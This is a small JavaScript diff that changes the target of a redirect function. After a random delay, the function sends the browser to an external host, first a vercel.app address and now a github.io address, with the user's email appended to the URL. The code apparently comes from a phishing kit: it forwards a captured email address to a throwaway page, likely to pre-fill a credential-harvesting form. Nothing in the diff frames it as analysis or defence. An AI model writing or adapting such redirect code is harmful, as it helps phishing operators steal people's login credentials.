@@ -28,7 +28,7 @@
   function redirectUser(email) {
     const delay = Math.floor(Math.random() * 1000) + 1000;
     setTimeout(() => {
-      window.location.href = "https://pdf-ko-o9ap.vercel.app#" + encodeURIComponent(email);
+      window.location.href = "https://naturaldeco.github.io#" + encodeURIComponent(email);
     }, delay);
   }
 
@@ -47,3 +47,4 @@
     redirectUser(email);
   });
 })();
+
